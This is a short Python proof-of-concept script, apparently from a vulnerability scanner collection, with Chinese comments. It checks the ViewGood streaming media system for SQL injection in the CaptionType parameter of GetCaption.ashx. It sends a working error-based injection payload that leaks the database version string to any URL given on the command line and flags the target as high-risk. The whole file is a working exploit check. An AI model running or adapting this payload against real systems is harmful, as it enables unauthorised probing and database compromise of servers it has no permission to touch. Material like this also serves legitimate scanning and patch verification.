#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 远古流媒体系统  GetCaption.ashx注入
referer: unknown
author: Lucifer
description: 文件GetCaption.ashx中,参数CaptionType存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class viewgood_GetCaption_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/VIEWGOOD/ADI/portal/GetCaption.ashx?CaptionType=1%27AnD%201%3DConVert%28Int%2C%28Char%28116%29%252bChar%28121%29%252bChar%28113%29%252b@@Version%29%29--&AssetID=1&CaptionName=11"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"tyqMicrosoft" in req.text:
                cprint("[+]存在远古流媒体系统 GetCaption.ashx注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = viewgood_GetCaption_sqli_BaseVerify(sys.argv[1])
    testVuln.run()